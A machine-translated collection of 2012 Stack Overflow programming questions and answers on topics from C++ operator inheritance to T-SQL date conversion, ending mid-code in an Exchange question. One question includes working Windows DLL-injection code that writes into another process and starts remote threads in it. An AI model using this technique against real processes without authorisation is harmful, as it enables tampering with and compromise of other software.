问题是，原始 CRM 本身在数据库中有自己的登录名和“用户”表。Galleon 使用自己的登录页面和“用户”文件。

我和我的搭档正在绞尽脑汁试图找出这个（诚然简单的）问题。我们考虑过定义一个全局变量（如会话）的可能性，一旦被 CRM 的主登录触发，它将绕过 Galleon 登录。

但这并不能解决告诉 Galleon 用户是谁以便他可以发帖的问题。

我在想解决这个问题的方法之一是将整个原始 CRM 用户文件插入到 Galleon 用户文件中。这样它就有一个相同的用户\通行证列表。

有什么想法吗？

分解：

用户在 CRM 初始页面登录-----> 带到 CRM index.cfm\main 面板。然后用户可以点击“CRM FORUM！” 而不是被重新提示输入用户\通行证，Galleon 知道他是谁，并允许他创建线程和发布。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T06:15:29.623

最好的方法是将您的 Galleon 论坛用户表与您的 CRM 同步，然后在您添加/删除/更新 CRM 用户时使它们保持同步。

做到这一点的关键是利用 Galleon 业务层 API——也就是 Galleon CFC 中的公共方法。这将使您不必修改 Galleon 的任何代码，如果您想轻松安装 Galleon 更新，我强烈建议您这样做。（顺便说一句，你应该保持你的第 3 方代码库是最新的，因为开源项目是黑客的热门目标——尤其是论坛。）

要同步现有用户，您需要编写一个脚本，迭代当前 CRM 的用户并为每个用户调用 Galleon 的 User.addUser() 方法，使用与 CRM 相同的用户/通行证组合（或者可能使用哈希其中）。请务必中断任何 Galleon 错误/故障，以免错过任何用户。

要使 Galleon 与您的 CRM 保持同步，请根据需要添加对 Galleon 的 CFC 的调用。例如，当您从 CRM 中删除用户时，调用 User.deleteUser()。

对于身份验证，您将使用 User.authenticate()，传递与您的 CRM 相同的用户/密码组合。

利用 3rd 方库的业务层 API 是一个比尝试修改它们以满足您的需求更好的长期解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:14:44.230

您所描述的正是有多少网站在工作，无论您使用何种机制进行身份验证（即 OAuth、Twitter 等）。您使用外部服务进行身份验证，并从该外部服务中获取某种类型的令牌说“这个人真的是经过身份验证的。” 由您的代码（在本例中为 Galleon）决定“此人已通过身份验证，但他们在我们的系统中没有帐户。让我们创建一个。” 这通常需要您返回外部服务以获取姓名、电子邮件地址等。

您很可能需要在您的外部服务中做一些额外的工作，以便更新 Galleon 中的客户信息。例如，如果有人更改了他们的电子邮件地址，那么 Galleon 中的电子邮件地址很可能也应该更新。这可能会变得复杂，但从客户的角度来看是必要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T20:46:27.760

肯定有很多方法可以让猫在这上面剥皮。我下载了 Galleon 2 论坛代码以查看 user.cfc

您可以修改此函数中的查询以从 CMS 中提取所需的字段：

```
<cffunction name="getUser" access="public" returnType="struct" output="false" hint="Returns a user.">

<cfquery name="qGetUser" datasource="#variables.dsn#">      
SELECT
    [cmsusertable].cmsid as ID,
    [cmsusertable].cmsuser as username, 
    [cmsusertable].cmspassword as password,
    [cmsusertable].cmsemail as emailaddress,
    [cmsusertable].createDate as datecreated,
    [cmsusertable].cmsactive as confirmed, 
    [cmsusertable].cmssignature as signature,
    [cmsusertable].cmsavatar as avatar
FROM
    [cmsusertable]users
WHERE 
    [cmsusertable].username = <cfqueryparam value="#arguments.username#" cfsqltype="CF_SQL_VARCHAR" maxlength="50">
</cfquery> 
```

请记住，您必须按照 Galleon 的期望从查询中返回字段，因此使用“as”语句将 CMS 数据库字段重命名为 Galleon 期望的字段。现在，您的 CMS 表中可能没有其中一些无关字段，例如签名/头像。如果您可以扩展您的 CMS 表和用户例程以适应这些字段，那可能会很好。或者您可以修改 Galleon 中的配置文件例程以仅更新签名/头像而不是整个配置文件。如果您确实使用 Galleon 表来存储此信息，请记住添加一个连接以包含这些请求重新统一用户数据的字段。

您还必须修改项目中大约 4 个文件（user.cfc、conference.cfc、message.cfc、thread.cfc）中的联接，以改为与您的 CMS 用户表联接。

最后，您必须修改 login.cfm 以简单地尝试使用 CMS 用户会话中的信息设置 session.user 结构，如果失败，则将用户重定向回 CMS 登录页面。

总的来说，我认为这不会太难。我确定我错过了一些东西，但也许那会让你继续前进。

# c++ - operator= 和 C++ 中未继承的函数？

> ID：12009865
> 
> 赞同：43
> 
> 时间：2012-08-17T16:50:16.803
> 
> 标签：c++, inheritance, operator-overloading, crtp

在我刚刚进行的测试之前，我相信只有构造函数不会在 C++ 中继承。但显然，任务`operator=`并不太...

1.  这是什么原因？
2.  是否有任何解决方法来继承赋值运算符？
3.  `operator+=`, `operator-=`, ...也是如此吗？
4.  所有其他函数（除了构造函数/操作符=）都继承了吗？

事实上，我在做一些 CRTP 时遇到了这个问题：

```
template<class Crtp> class Base
{
    inline Crtp& operator=(const Base<Crtp>& rhs) {/*SOMETHING*/; return static_cast<Crtp&>(*this);}
};

class Derived1 : public Base<Derived1>
{
};

class Derived2 : public Base<Derived2>
{
}; 
```

有什么解决方案可以让它工作吗？

编辑：好的，我已经隔离了问题。为什么以下不起作用？如何解决问题？

```
#include <iostream>
#include <type_traits>

// Base class
template<template<typename, unsigned int> class CRTP, typename T, unsigned int N> class Base
{
    // Cast to base
    public:
        inline Base<CRTP, T, N>& operator()()
        {
            return *this;
        }

    // Operator =
    public:
        template<typename T0, class = typename std::enable_if<std::is_convertible<T0, T>::value>::type>
        inline CRTP<T, N>& operator=(const T0& rhs)
        {
            for (unsigned int i = 0; i < N; ++i) {
                _data[i] = rhs;
            }
            return static_cast<CRTP<T, N>&>(*this);
        }

    // Data members
    protected:
        T _data[N];
};

// Derived class
template<typename T, unsigned int N> class Derived : public Base<Derived, T, N>
{
};

// Main
int main()
{
    Derived<double, 3> x;
    x() = 3; // <- This is OK
    x = 3;   // <- error: no match for 'operator=' in ' x=3 '
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-08-17T16:52:48.597

赋值运算符在技术上是继承的；但是，它总是被派生类的显式或隐式定义的赋值运算符隐藏（参见下面的注释）。

> (13.5.3 赋值) 赋值运算符应该由一个只有一个参数的非静态成员函数来实现。因为`operator=`如果未由用户声明，则为类隐式声明复制赋值运算符，因此基类赋值运算符始终被派生类的复制赋值运算符隐藏。

您可以实现一个虚拟赋值运算符，它只是将调用转发到基类`operator=`，如下所示：

```
// Derived class
template<typename T, unsigned int N> class Derived : public Base<Derived, T, N>
{
public:
    template<typename T0, class = typename std::enable_if<std::is_convertible<T0, T>::value>::type>
    inline Derived& operator=(const T0& rhs)
    {
        return Base<Derived, T, N>::operator=(rhs);
    }
}; 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-08-17T17:22:52.453

赋值运算符*是*继承的，有点，但是......在任何给定的类中，如果您不提供复制赋值运算符，编译器会为您生成一个。这意味着您的派生类有效地具有赋值运算符：

```
Derived& operator=( Derived const& ); 
```

并且适用通常的隐藏规则；这隐藏了所有基类赋值运算符。（如果基类有一个带有此签名的赋值运算符，则派生类将正常继承它。）

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-17T17:33:14.633

1.  您的赋值运算符在技术上是继承的，但随后它被派生类中的默认复制赋值运算符隐藏。然后，此默认复制分配尝试调用不存在的基类复制分配，因为您使用自己的分配隐藏了它。

2.  解决这个问题的最明智的方法是不要以不明显的方式使用运算符重载（`=`例如，不意味着复制分配）。在这种情况下，不要使用`operator=`: 将其`assign`称为 or `set`，然后它将继承并且不会被子副本分配隐藏。

3.  这些运算符是继承的，并且没有编译器版本，因此它们永远不会像`operator=`.

4.  它实际上只是没有被继承的构造函数，我想不出任何其他编译器生成的函数可以像`operator=`.

# javascript - 获取访问令牌的客户端代码不起作用

> ID：12009868
> 
> 赞同：0
> 
> 时间：2012-08-17T16:50:21.690
> 
> 标签：javascript, facebook-graph-api

我正在使用客户端身份验证代码从[http://developers.facebook.com/docs/authentication/client-side/](http://developers.facebook.com/docs/authentication/client-side/)（没有 JS SDK）获取访问令牌到我作为经理的页面之一。我已经更改了 App id 和图形 url (https://graph.facebook.com/page_id) 以获取访问令牌。但是当我运行脚本时，我在 FB 页面中遇到错误。我的网址是（https://www.facebook.com/dialog/oauth?client_id=app_id&redirect_uri=file:///C:/work/dashboard/FBGraph.html&response_type=token）。请指教。

谢谢， 马杜拉

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T19:58:19.840

看起来您正在重定向到硬盘上的本地文件，redirect_uri= **file:///C:/work/dashboard/FBGraph.html**您需要重定向到与列出的 Web URL 相关的真实 Web URL你的应用程序。

# c++ - 为什么不将 __if_exists 与局部变量一起使用？

> ID：12009869
> 
> 赞同：1
> 
> 时间：2012-08-17T16:50:24.233
> 
> 标签：c++, visual-c++

Microsoft 特定声明的[MSDN 文档说明了以下内容（添加了重点）：](http://msdn.microsoft.com/en-us/library/x7wy9xh3%28v=vs.100%29.aspx)`__if_exists`

> 将 __if_exists 语句应用于类内部或外部的标识符。**不要将 __if_exists 语句应用于局部变量**。

不幸的是，没有解释为什么不应该将它应用于局部变量。它编译得很好并且具有预期的效果，所以我想知道是否有人知道他们为什么说不这样做。是正确性问题、可维护性问题还是其他问题？

我意识到这是 Microsoft 特有的功能，不可移植，但为了争论，我们假设有充分的理由使用它。

**编辑**：有些人很好奇我为什么要这样做，所以这里有一个解释。*我意识到这是一个肮脏的黑客，所以除非你有一个更好的方法来做它的好建议，否则请不要费心指出它很恶心。考虑到代码库的庞大规模，这是我们能找到的最便宜的替代方案。*

我们有大量遗留代码（数百万行），它们使用 Microsoft 特定的`__FUNCTION__`宏作为错误日志记录包的一部分。该代码的很大一部分现在包装在 lambda 函数中，以便我们可以捕获结构化异常（使用`__try`/ `__except`）并仍然使用不可缠绕的对象。在那些 lambda 函数中，`__FUNCTION__`计算出一些无用的东西，比如``anonymous-namespace'::<lambda23>::operator()`，这对任何东西都没有用。我们的解决方法是定义类似 new`__FUNCTION__`的宏，该宏使用`__if_exists`. 由于宏的工作方式，我们可以轻松切换到新的`__FUNCTION__`替换并轻松定义备用名称变量，而无需更改大量代码，因此考虑到限制，这是一个相当干净的解决方案。也就是说，当然，假设使用`__if_exists`这种方式是有效的。

正如我上面所说，我知道这是一个肮脏的黑客，所以请不要告诉我它有多丑陋，除非你对如何做得更好有好的想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:58:14.323

我不确定，但一种猜测是局部变量可能会被编译器优化掉，当然也可能不是，这使得 __if_exists 测试不可靠。

而且我也看不出对局部变量执行此操作的原因，您处于特定范围内，您什么都知道，为什么要测试局部变量是否存在？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-07-14T11:18:14.400

`__if_exists`是 Visual C++ 中的一个[肮脏的旧 hack](https://devblogs.microsoft.com/oldnewthing/20190828-00/?p=102812)，具有严重的实现限制，因为它仅适用于 ATL。

局部变量是特殊的，因为你可以有两个同名的局部变量：

```
void foo()
{ 
  int i = 1;
  {
    int i = 2;
  }
} 
```

这意味着编译器内部有一个更复杂的数据结构来跟踪它们。`__if_exists`必须进行名称查找，这对于像这样的某些类型的嵌套范围可能不正确。

另一个历史案例是，在 Visual C++ 中，`for`范围不正确：

```
void foo()
{ 
  for (int i = 1; false; ) { }
  __if_exists(i) // What do you expect? VC++ let i escape.
} 
```

# android - 将缺失的日期插入到 sqlite 结果集中？

> ID：12009873
> 
> 赞同：0
> 
> 时间：2012-08-17T16:50:38.367
> 
> 标签：android, sqlite

我有一个表格，里面填满了给定日期的数据。有时我没有某一天的行，因为我可能没有那一天的数据。现在，当我查询以获取结果时，我希望结果集包含从最早日期到最新日期的每个日期的一行。有没有办法形成一个查询，当结果集中缺少日期而不实际将它们插入数据库时​​，该查询将生成默认行？日期列的格式为 YYYY-MM-DD。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:54:59.830

无论数据类型如何，您都可以为表中的任何列创建默认值。请阅读有关[SQL DEFAULT 约束](http://www.w3schools.com/sql/sql_default.asp)的信息。

```
CREATE TABLE Foo (
    _id INTEGER PRIMARY KEY, 
    date TEXT DEFAULT '2012-08-17'); 
```

或者，如果您想在每次查询数据库时返回默认值，请使用[IfNull()](http://www.w3schools.com/sql/sql_isnull.asp)：

```
SELECT IfNull(date, '2012-08-17') FROM Foo; 
```

（我假设您`date`是文本，但是您可以轻松更改它。）

# algorithm - R比较所有列表元素的重复项

> ID：12009875
> 
> 赞同：0
> 
> 时间：2012-08-17T16:50:45.443
> 
> 标签：algorithm, r, graph

我正在通过图表查看所有可能的路径。我编写了一个 DFS 算法来找到所有这些路径。我想确保我的算法正常工作并且没有两条路径是相同的。我的算法返回一个如下所示的列表：

```
....
[[2770]]
 [1]   1   2   3  52  53  54  55  56  57  58  59  60  12  11  10   9   8  78  79  80 113       114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129
[38] 130 131 132 133 134 137 138 139 140 141 142 143 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166

[[2771]]
 [1]   1   2   3  52  53  54  55  56  57  58  59  60  12  11  10   9   8  78  79  80 113 114 115 143 144 145 146 147 148 149 150 151 152 153 154 155 156
[38] 157 158 159 160 161 162 163 164 165 166

[[2772]]
 [1]   1   2   3  52  53  54  55  56  57  58  59  60  12  11  10   9   8  78  79  80 113 114 115 143 150 151 152 153 154 155 156 157 158 159 160 161 162
[38] 163 164 165 166 
```

如您所见，该列表有 2772 个元素。这意味着该图有 2,772 条路径。如何轻松比较所有列表元素以确保没有重复项。需要说明的是，相同的一组数字但顺序不同，代表不同的路径，不是重复的！

感谢您的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T16:58:24.383

也许像

```
test<-list(1:2,3:4,5:7,1:10,3:4,4:3)
dups<-duplicated(test)
idups<-seq_along(test)[dups] 
```

# c# - 继承解决方案

> ID：12009877
> 
> 赞同：2
> 
> 时间：2012-08-17T16:51:10.393
> 
> 标签：c#, .net, inheritance, polymorphism

我一直致力于构建几个从一个基类继承的类，但我对现阶段 C# 中的继承和多态性如何工作并不完全有信心。

我的基类如下所示：

```
abstract class Structure
    {
        public int currentCost = 0;
        public int currentArea = 0;
        public int currentPopulation = 0;
        public int currentConstruction = 0;
        public int currentEnergy = 0;
        public int currentEconomy = 0;

        public abstract int baseCost { get; }
        public abstract int baseEnergy { get; }
        public abstract int baseEconomy { get; }
        public abstract int baseConstruction { get; }
        public int baseArea = -1;
        public int basePopulation = -1;

        public int level = 0;
        public abstract string structureName { get; }
} 
```

现在，从类继承的`Structure`类将为抽象变量提供自己的分配，这很好，因为大多数类在它们分配的数字中变化很大。抽象变量以下列（不完整）方式在派生类中使用：

```
class BiosphereModification : Structure
    {
        const int baseEconomyBiosphereModification = 0;
        const int baseConstructionBiosphereModification = 0;
        const int baseCostBiosphereModification = 2000;
        const int baseEnergyBiosphereModification = 0;
        const int baseFertilityBiosphereModification = 1;
        const string structureNameBiosphereModification = "BiosphereModification";

        public override int baseCost { get { return baseCostBiosphereModification; } }
        public override int baseEconomy { get { return baseEconomyBiosphereModification; } }
        public override int baseEnergy { get { return baseEnergyBiosphereModification; } }
        public override int baseConstruction { get { return baseConstructionBiosphereModification; } }
} 
```

但是，非抽象变量在大多数派生类中都是相同的，但不是全部。

我可以将它们全部抽象化并强制每个类提供它自己的值，但这似乎违反直觉。我更喜欢的是一种在基类中提供值并在需要时在派生类中提供覆盖的方法。

有没有办法做到这一点？我知道这可以通过声明的方法来完成`virtual`。这允许派生类使用基类方法，除非它提供它自己的方法之一。肯定存在类似的事情吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:54:07.197

> 我更喜欢的是一种在基类中提供值并在需要时在派生类中提供覆盖的方法。

属性也可以声明为虚拟的：

```
public virtual int BaseCost { get { return 0; } }
public virtual int BaseEnergy { get { return 42; } }
public virtual int BaseEconomy { get { return 3982; } }
public virtual int BaseConstruction { get { return 398829; } } 
```

然后，您可以在适当的时候覆盖它们：

```
public override int BaseCost { get { return 2; } } 
```

# ruby-on-rails - 如何解决此路由错误？

> ID：12009880
> 
> 赞同：0
> 
> 时间：2012-08-17T16:51:25.567
> 
> 标签：ruby-on-rails

在我的 Rails 应用程序中，退出链接不起作用，我不确定我能做些什么来修复它。在我的 Heroku 日志中，当我尝试从我的用户帐户注销时，我收到以下错误：

ActionController::RoutingError (没有路由匹配 [GET] "/signout"):

我的 config/routes.rb 文件中有以下路由：

```
match '/signout', to: 'sessions#destroy', via: :delete 
```

在我的会话控制器中，我有以下方法：

```
def destroy
    sign_out
    redirect_to root_path
end 
```

然后在我的 session_shelper.rb 文件中，我有以下 sign_out 方法：

```
 def sign_out
    self.current_user = nil
    cookies.delete(:remember_token)
  end 
```

从我的角度来看，一切似乎都是正确的，所以我不确定是什么导致了错误或如何修复它。我的应用程序托管在 Heroku 上，以防万一。非常感谢！

session_controller.rb

```
 class SessionsController < ApplicationController

  def new
  end

  def create
    user = User.find_by_email(params[:session][:email])
    if user && user.authenticate(params[:session][:password])
      sign_in user
      redirect_to info_path
    else
      flash.now[:error] = 'Invalid email/password combination'
      render 'new'
    end
  end

  def destroy
    sign_out
    redirect_to root_path
  end

end

           <nav>
            <ul class="nav pull-right">
            <% if signed_in? %>
                <li><%= link_to "Settings", edit_user_path(current_user) %></li>
                    <li class="divider"></li>
                <li><%= link_to "Sign out", signout_path, method: "delete" %></li>
            </ul>
            <% else %>
                <li><%= link_to "Sign in", signin_path %>
            <% end %>
            </ul>
        </nav> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:53:06.667

改变

```
match '/signout', to: 'sessions#destroy', via: :delete 
```

至

```
match '/signout' => 'sessions#destroy', :via => :delete 
```

改变

`method: "delete"`至`:method => :delete`

# phantomjs - 使用 phantomjs 读取响应正文

> ID：12009881
> 
> 赞同：2
> 
> 时间：2012-08-17T16:51:29.490
> 
> 标签：phantomjs

有什么方法可以使用 phantomjs 请求资源并能够访问响应的正文？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-10-15T06:21:02.937

更新：关于“获取并使用所有其他资源（如图像、CSS、字体等）做某事”的其他可能含义，我最近[在 SlimerJS 中写了一篇博客如何做到这一点](http://darrendev.blogspot.jp/2013/11/saving-downloaded-files-in-slimerjs-and.html)。我相信从 1.9.1 开始，在 PhantomJS 中做到这一点的唯一方法是应用补丁并重新编译。

* * *

也许我误解了您所说的“响应体”是什么意思，或者它可能比这个问题最近被添加到 PhantomJS 中，但它就像这样简单：

```
var page = require('webpage').create();
var url = 'http://google.com/';
page.open(url,function(){
  console.log(page.content);
  phantom.exit();
  }); 
```

（顺便说一句，使用`page.plainText`它来获取它没有 HTML 标记。）

如果您只想要`<body>`标签内容，那么没有`<head>`一种方法可以用来获取响应的任何部分：

```
var page = require('webpage').create();
var url = 'http://google.com/';
page.open(url,function(){
  var html = page.evaluate(function(){
    return document.getElementsByTagName('body')[0].innerHTML;
    });
  console.log(html);
  phantom.exit();
  }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-26T08:46:04.740

使用`slimmerjs`. 您所有的“phantomjs”代码也可以与“slimmerjs”一起使用。

更多信息[在这里](http://docs.slimerjs.org/current/api/webpage.html#onresourcereceived)。请注意`body`末尾的属性，该属性目前仅适用于 slimmerjs。

注意：请设置`page.captureContent = [/.*/]`“正文”以显示在响应中。有关此的更多信息：[这里](http://docs.slimerjs.org/current/api/webpage.html#capturecontent)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-24T07:52:16.710

这是目前 PhantomJS 的一大问题。开放（截至撰写时）票位于[http://code.google.com/p/phantomjs/issues/detail?id=158](http://code.google.com/p/phantomjs/issues/detail?id=158)并且到目前为止，还没有可靠的解决方案。这适用于收集您的请求数据和响应数据，因此您无法收集您提交的帖子数据，然后使用类似 CasperJS 下载的方案重新发送。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-09-30T12:55:53.177

SlimerJS 不能在较新版本的 FireFox 上工作，因此对我没有好处。

[这个答案](https://stackoverflow.com/a/58168312/1265306)解释了如何在 2019 年末从今天的 XHR 获取响应正文

# winapi - DLL 注入：调用 dll 中的函数

> ID：12009882
> 
> 赞同：1
> 
> 时间：2012-08-17T16:51:31.073
> 
> 标签：winapi, dll, dll-injection

首先，代码的某些部分来自[注入的 DLL 中的调用函数，](https://stackoverflow.com/questions/10057687/calling-function-in-injected-dll)但在某些地方它不起作用。

我有一个关于 DLL 注入的问题：在我将库加载到另一个进程之后：

```
HANDLE InjectDLL(DWORD ProcessID, char *dllName)
{
    HANDLE Proc;
    char buf[50]={0};
    LPVOID RemoteString, LoadLibAddy;

    if(!ProcessID)
        return NULL;

    Proc = OpenProcess(CREATE_THREAD_ACCESS, FALSE, ProcessID);

    if(!Proc)
    {
        sprintf(buf, "OpenProcess() failed: %d", GetLastError());
        MessageBox(NULL, buf, "Loader", NULL);
        return NULL;
    }

    LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(dllName), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(Proc, (LPVOID)RemoteString, dllName, strlen(dllName), NULL);
    HANDLE hThread = CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);   

    if( hThread != 0 ) {
        WaitForSingleObject( hThread, INFINITE );
        GetExitCodeThread( hThread, ( LPDWORD )&hInjected );
        CloseHandle( hThread );
    }

    CloseHandle(Proc);

    return  hThread != 0 ? Proc : NULL;
} 
```

我想从该空间内调用一个函数：

```
void* GetPayloadExportAddr( LPCSTR lpPath, HMODULE hPayloadBase, LPCSTR lpFunctionName ) 
{
    // Load payload in our own virtual address space
    HMODULE hLoaded = LoadLibrary( lpPath );

    if( hLoaded == NULL ) {
        return NULL;
    } else {
        void* lpFunc   = GetProcAddress( hLoaded, lpFunctionName );
        DWORD dwOffset = (char*)lpFunc - (char*)hLoaded;

        FreeLibrary( hLoaded );
        return (void*)((DWORD)hPayloadBase + dwOffset);
    }
}

BOOL InitPayload( HANDLE hProcess, LPCSTR lpPath, HMODULE hPayloadBase) 
{   
    void* lpInit = GetPayloadExportAddr( lpPath, hPayloadBase, "Start" );
    if( lpInit == NULL ) {
        return FALSE;
    }
    else {
        HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)lpInit, (LPVOID) NULL, 0, NULL );

        if( hThread == NULL ) {
          return FALSE;
        } 
        else {
          CloseHandle( hThread );
        }
      }
    return TRUE;
} 
```

从 IDA 返回当前`GetPayloadExportAddr`位置（我猜那是我的函数开始的空间）。

所以问题出在`InitPayload`函数上，当我尝试创建新线程时，它没有这样做，我不知道为什么。

我的dll如下：

```
extern "C"
{
    __declspec(dllexport) void* Start(LPVOID param)
    {
        MessageBox(NULL, L"Start", L"Hello", MB_OK);
        return NULL;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
} 
```

问题是，如果我将 Start 方法放在 DLL_PROCESS_ATTACH 上，它就可以工作，否则就不行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-03-28T21:51:25.593

您的 GetPayloadExportAddr() 返回本地进程中函数的地址。如果模块的基地址不同，则该地址在其他进程中不会相同，这在 DLL 文件中很常见，如果它们的 PreferredImageBase 不可用则可以重定位。

您应该修改 GetPayloadExportAddr() 函数以返回偏移量。然后获取目标进程中模块的地址。将这两个加在一起，这就是您在目标进程中调用的正确地址。

# apache - Apache Solr 3.5 - 4.0 HunspellStemFilter 在控制台/命令行中使用相同的字典返回另一个值而不是 Hunspell

> ID：12009883
> 
> 赞同：2
> 
> 时间：2012-08-17T16:51:37.820
> 
> 标签：apache, solr, spell-checking, full-text-search, hunspell

当我使用 HunspellStemFilter 对捷克语文本进行词干处理时，它给我带来了不好的结果。

例如单词“praha”返回“praha”和“prahnout”，这是不正确的。

所以我在我的控制台（Hunspell 命令行）中使用完全相同的字典尝试相同的操作，它只返回“praha”，这是正确的。

有人可以帮助我吗？

# sql - 带有日期转换的 TSQL 派生列，用于检查非日期可转换字符串

> ID：12009884
> 
> 赞同：2
> 
> 时间：2012-08-17T16:51:44.077
> 
> 标签：sql, tsql, sql-server-2008-r2, type-conversion

我有一个日期列，其中日期存储为字符串，例如 20120817。不幸的是，填充此列的文本表单字段是自由文本，因此我不能保证偶尔会在此列中显示“E”或“whatever”。而且已经有不少了。

我需要做的是将字符串列转换为日期列。当然，转换会拒绝随机字符串字符。有什么方法可以创建一个派生列，它不仅可以转换字符串，还可以排除非日期可转换字符串？

如果表中没有非日期可转换字符串，则以下内容将起作用：

```
ADD [convertedDate] AS CONVERT(DATE, [stringDate], 102) 
```

它确实在我创建的测试表中完美运行。但是当我引入其他不可转换的字符串时，由于明显的原因，我收到了可怕的“从字符串转换日期和/或时间时转换失败”错误。

是否有一个函数可以捕获我可以添加到这个派生列代码中的不可转换元素？还是视图或函数是处理此问题的唯一或最佳方法？我很幸运地玩了 IsDate() 。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:00:13.763

如果您使用的是 SQL Server 2012，则可以使用 try_convert 函数

[http://msdn.microsoft.com/en-us/library/hh230993.aspx](http://msdn.microsoft.com/en-us/library/hh230993.aspx)

转换成功则正常工作，转换失败则返回null

添加 [convertedDate] AS TRY_CONVERT(DATE, [stringDate], 102)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T17:00:50.403

有一个函数`ISDATE(date)`叫做

```
ADD [convertedDate] AS CASE WHEN ISDATE([stringDate]) = 1 THEN CONVERT(DATE,[stringDate], 102) ELSE NULL END 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:15:06.250

这应该会给你一些想法......

```
DECLARE @date1 varchar(50)
DECLARE @date2 varchar(50)
SET @date1 = '20120101'
SET @date2 = 'e20120101'

SELECT
ISDATE(@date1),
ISDATE(@date2),
CASE WHEN ISDATE(@date1) = 1 THEN CONVERT(SMALLDATETIME,@date1) END,
CASE WHEN ISDATE(@date2) = 1 THEN CONVERT(SMALLDATETIME,@date2) END 
```

# windows - 批量查找字符串

> ID：12009889
> 
> 赞同：0
> 
> 时间：2012-08-17T16:52:02.467
> 
> 标签：windows, batch-file

我对 Batch 比较陌生，并且在尝试在 txt 文件中查找字符串值时遇到问题。我正在使用一个名为 CCExtactor 的简洁程序从文件中提取隐藏式字幕，并且需要获取隐藏式字幕的时间。

CCExtractor 的输出如下所示：

```
###SUBTITLE#08:37#08:40#She ran away 
```

我的批处理脚本如下所示：

```
for /F "delims=" %%a in (subtitle.txt) do ( echo %1|findstr /R /C:"^[^0-9][0-9]*$" ) 
```

我似乎无法让它工作！我正在尝试浏览时间值！

我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:06:40.440

在您的 for 语句中，您应该将`delims`值设为`#`. 这样您就可以回显`%%d`并`%%e`获取开始时间和结束时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:30:29.867

这是一个例子。

```
@echo off
setlocal
set filename=subtitle.txt
for /f "delims=# tokens=2,3" %%I in ('findstr /r /c:"^###SUBTITLE#[0-9][0-9]:[0-9][0-9]#[0-9][0-9]:[0-9][0-9]#" %filename%') do (
  echo start=%%I, end=%%J
) 
```

# asp.net - EWS 约会上的 ServiceObjectPropertyException

> ID：12009890
> 
> 赞同：1
> 
> 时间：2012-08-17T16:52:03.780
> 
> 标签：asp.net, exchangewebservices

我正在使用 EWS API 将约会导出到用户的交换日历。它工作正常，但我在约会中注意到 html 的格式不正确，表格对齐等。因此，我尝试将约会正文类型属性设置为 HTML，但在我设置属性的那一行上得到了 ServiceObjectPropertyException 说“您必须先加载或分配此属性，然后才能读取它的值”。

```
 User SelectedUser = UserController.GetExchangeCredentials(UserID);

                //If they have their exchange credentials setup then create the appointment in their exchange calender
                if (SelectedUser.ExchangeUsername != String.Empty)
                {
                    Client ClientInfo = ClientController.GetContactInfoForCalenderAppointment(int.Parse(btn_SubmitNextContactDate.CommandArgument.ToString()), int.Parse(ddl_Contact.SelectedValue));

                    //Setup the exchange service with the user credentials of that receiving the appointment
                    ExchangeService Service = new ExchangeService(ExchangeVersion.Exchange2007_SP1);
                    Service.UseDefaultCredentials = false;
                    Service.Credentials = new WebCredentials(SelectedUser.ExchangeUsername, SelectedUser.ExchangePassword, SelectedUser.ServerDomain);
                    Service.AutodiscoverUrl(SelectedUser.Email);

                    //Create the appointment
                    Microsoft.Exchange.WebServices.Data.Appointment Appointment = new Microsoft.Exchange.WebServices.Data.Appointment(Service);
                    Appointment.Body.BodyType = BodyType.HTML;
                    Appointment.Subject = "Next Contact Date for " + OperatingName.Text;                        
                    Appointment.Body = "<table><tr><td><b>Client Name:</b></td><td>" + ClientName.Text + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Operating Name:</b></td><td>" + OperatingName.Text + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Service:</b></td><td>" + ddl_ServiceType.SelectedItem.Text + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Contact Method:</b></td><td>" + ddl_ContactMethod.SelectedItem.Text + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Contact Name:</b></td><td>" + ddl_Contact.SelectedItem.Text + "</td></tr>";
                    Appointment.Body += "<tr><td><b>Contact Phone:</b></td><td>" + ClientInfo.Contacts[0].Phone + "</td></tr>";
